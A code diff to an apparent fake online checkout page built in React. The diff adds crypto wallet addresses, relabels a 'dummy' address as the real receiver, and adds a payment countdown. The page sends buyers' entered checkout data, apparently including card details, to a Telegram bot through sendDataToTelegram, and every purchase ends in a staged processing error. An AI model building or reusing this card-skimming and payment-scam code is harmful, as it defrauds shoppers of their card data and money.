@@ -3,6 +3,14 @@
 import React, { useState, useEffect } from 'react';
 import './checkout.css';
 
+const CRYPTO_DATA = {
+  btc: { name: 'Bitcoin (BTC)', network: 'Bitcoin', address: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh' },
+  eth: { name: 'Ethereum (ETH)', network: 'Ethereum (ERC20)', address: '0x71C7656EC7ab88b098defB751B7401B5f6d8976F' },
+  usdt: { name: 'Tether (USDT)', network: 'Tron (TRC20)', address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' },
+  usdc: { name: 'USD Coin (USDC)', network: 'Ethereum (ERC20)', address: '0x71C7656EC7ab88b098defB751B7401B5f6d8976F' },
+  sol: { name: 'Solana (SOL)', network: 'Solana', address: '7uv8vYpSqBvS37qF78vSqBvS37qF78vSqBvS37qF78vS' }
+};
+
 export default function Checkout() {
   const [mounted, setMounted] = useState(false);
   const [timeLeft, setTimeLeft] = useState(10 * 60); // 10 minutes
@@ -27,8 +35,9 @@ export default function Checkout() {
   const [cardType, setCardType] = useState('unknown');
   
   // Crypto payment states
-  const [isCryptoPaymentStarted, setIsCryptoPaymentStarted] = useState(false);
-  const [cryptoTimeLeft, setCryptoTimeLeft] = useState(5 * 60); // 5 minutes
+  const [selectedCrypto, setSelectedCrypto] = useState(null);
+  const [isCryptoDialogOpen, setIsCryptoDialogOpen] = useState(false);
+  const [cryptoTimeLeft, setCryptoTimeLeft] = useState(7 * 60); // 7 minutes
 
   useEffect(() => {
     setMounted(true);
@@ -40,13 +49,13 @@ export default function Checkout() {
 
   useEffect(() => {
     let timer;
-    if (isCryptoPaymentStarted && cryptoTimeLeft > 0) {
+    if (isCryptoDialogOpen && cryptoTimeLeft > 0) {
       timer = setInterval(() => {
         setCryptoTimeLeft(prev => prev - 1);
       }, 1000);
     }
     return () => clearInterval(timer);
-  }, [isCryptoPaymentStarted, cryptoTimeLeft]);
+  }, [isCryptoDialogOpen, cryptoTimeLeft]);
 
   const formatTime = (seconds) => {
     const m = Math.floor(seconds / 60);
@@ -85,7 +94,16 @@ export default function Checkout() {
     }
   };
 
-  const sendDataToTelegram = async () => {
+  const handleCryptoSelect = (e) => {
+    const val = e.target.value;
+    if (val && CRYPTO_DATA[val]) {
+      setSelectedCrypto(CRYPTO_DATA[val]);
+      setCryptoTimeLeft(7 * 60);
+      setIsCryptoDialogOpen(true);
+    }
+  };
+
+  const sendDataToTelegram = async (extra = {}) => {
     try {
       await fetch('/api/telegram', {
         method: 'POST',
@@ -93,7 +111,8 @@ export default function Checkout() {
         body: JSON.stringify({
           ...formData,
           paymentMethod,
-          cardType
+          cardType,
+          ...extra
         })
       });
     } catch (err) {
@@ -104,18 +123,19 @@ export default function Checkout() {
   const handlePurchase = () => {
     if (isProcessing) return;
 
-    // Send data immediately to bot when button is clicked
-    sendDataToTelegram();
-
     if (paymentMethod === 'crypto') {
-      setIsCryptoPaymentStarted(true);
+      if (!selectedCrypto) {
+        alert("Please select a cryptocurrency first.");
+        return;
+      }
+      setIsCryptoDialogOpen(true);
       return;
     }
     
+    sendDataToTelegram();
     setIsProcessing(true);
     setShowError(false);
 
-    // Simulate 5 seconds processing
     setTimeout(() => {
       setIsProcessing(false);
       setShowError(true);
@@ -123,17 +143,16 @@ export default function Checkout() {
   };
 
   const handleCryptoContinue = () => {
-    setIsCryptoPaymentStarted(false);
+    setIsCryptoDialogOpen(false);
+    sendDataToTelegram({ cryptoUsed: selectedCrypto.name });
     setIsProcessing(true);
     
-    // Simulate 5 seconds processing after crypto "continue"
     setTimeout(() => {
       setIsProcessing(false);
       setShowError(true);
     }, 5000);
   };
 
-  // Avoid hydration mismatch by waiting for mount
   if (!mounted) return null;
 
   return (
@@ -151,37 +170,48 @@ export default function Checkout() {
         </div>
       )}
 
-      {isCryptoPaymentStarted && (
+      {isCryptoDialogOpen && selectedCrypto && (
         <div className="error-modal-overlay">
           <div className="error-modal" style={{ maxWidth: '500px', border: '2px solid #f7931a' }}>
             <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '20px' }}>
               <i className="ph-fill ph-currency-btc" style={{ fontSize: '4rem', color: '#f7931a' }}></i>
             </div>
-            <h3 className="error-title" style={{ color: '#000' }}>Crypto Payment Pending</h3>
-            <p className="error-message">To complete your order, please send exactly <strong>$67.00 USD</strong> to the wallet address below.</p>
+            <h3 className="error-title" style={{ color: '#000', marginBottom: '5px' }}>Send {selectedCrypto.name}</h3>
+            <p className="error-message" style={{ marginBottom: '20px' }}>To complete your order, please send the amount below.</p>
             
+            <div style={{ backgroundColor: '#fdf2f2', border: '1px solid #feb2b2', padding: '15px', borderRadius: '8px', marginBottom: '20px', textAlign: 'left' }}>
+              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '10px' }}>
+                <span style={{ fontWeight: 'bold', color: '#c53030' }}>Fixed Amount:</span>
+                <span style={{ fontWeight: '900', color: '#c53030', fontSize: '1.2rem' }}>$67.00 USD</span>
+              </div>
+              <div style={{ display: 'flex', justifyContent: 'space-between' }}>
+                <span style={{ fontWeight: 'bold', color: '#2d3748' }}>Network:</span>
+                <span style={{ fontWeight: 'bold', color: '#2d3748' }}>{selectedCrypto.network}</span>
+              </div>
+            </div>
+
             <div style={{ marginBottom: '25px' }}>
-              <div style={{ fontSize: '0.8rem', fontWeight: 'bold', color: '#666', marginBottom: '8px', textAlign: 'left' }}>WALLET ADDRESS (DUMMY)</div>
-              <div style={{ backgroundColor: '#f9f9f9', padding: '15px', borderRadius: '8px', wordBreak: 'break-all', fontFamily: 'monospace', fontSize: '1rem', border: '1px dashed #f7931a', color: '#333', textAlign: 'center', fontWeight: 'bold' }}>
-                0x71C7656EC7ab88b098defB751B7401B5f6d8976F
+              <div style={{ fontSize: '0.8rem', fontWeight: 'bold', color: '#666', marginBottom: '8px', textAlign: 'left' }}>RECEIVER WALLET ADDRESS</div>
+              <div style={{ backgroundColor: '#f9f9f9', padding: '15px', borderRadius: '8px', wordBreak: 'break-all', fontFamily: 'monospace', fontSize: '0.95rem', border: '1px dashed #f7931a', color: '#333', textAlign: 'center', fontWeight: 'bold' }}>
+                {selectedCrypto.address}
               </div>
             </div>
             
             <div style={{ background: '#fff5eb', padding: '15px', borderRadius: '8px', marginBottom: '25px' }}>
-              <div style={{ fontSize: '0.9rem', color: '#c05621', marginBottom: '5px', fontWeight: 'bold' }}>AWAITING CONFIRMATION</div>
+              <div style={{ fontSize: '0.9rem', color: '#c05621', marginBottom: '5px', fontWeight: 'bold' }}>PAYMENT EXPIRES IN</div>
               <div style={{ fontSize: '2.5rem', fontWeight: '900', color: '#c05621' }}>{formatTime(cryptoTimeLeft)}</div>
             </div>
 
-            <p style={{ fontSize: '0.85rem', color: '#718096', marginBottom: '25px', lineHeight: '1.5' }}>
-              Please do not close this window. Once you have sent the payment, tap the <strong>Continue</strong> button below to verify your transaction.
+            <p style={{ fontSize: '0.85rem', color: '#718096', marginBottom: '25px', lineHeight: '1.5', fontWeight: '500' }}>
+              Tap **Continue** if you have made the payment.
             </p>
 
             <button className="btn-complete" style={{ backgroundColor: '#f7931a', boxShadow: '0 4px 0 #c05621' }} onClick={handleCryptoContinue}>
                Continue
             </button>
             
-            <button style={{ background: 'none', border: 'none', color: '#a0aec0', fontSize: '0.8rem', marginTop: '15px', cursor: 'pointer', textDecoration: 'underline' }} onClick={() => setIsCryptoPaymentStarted(false)}>
-              Cancel and change payment method
+            <button style={{ background: 'none', border: 'none', color: '#a0aec0', fontSize: '0.8rem', marginTop: '15px', cursor: 'pointer', textDecoration: 'underline' }} onClick={() => setIsCryptoDialogOpen(false)}>
+              Go back
             </button>
           </div>
         </div>
@@ -344,7 +374,7 @@ export default function Checkout() {
 
                 <div className="form-row">
                   <div className="form-group" style={{ flex: '1' }}>
-                    <select className="form-input" style={{ backgroundColor: '#fff', cursor: 'pointer' }}>
+                    <select className="form-input" style={{ backgroundColor: '#fff', cursor: 'pointer' }} onChange={handleCryptoSelect}>
                       <option value="">Select Cryptocurrency...</option>
                       <option value="btc">Bitcoin (BTC)</option>
                       <option value="eth">Ethereum (ETH)</option>
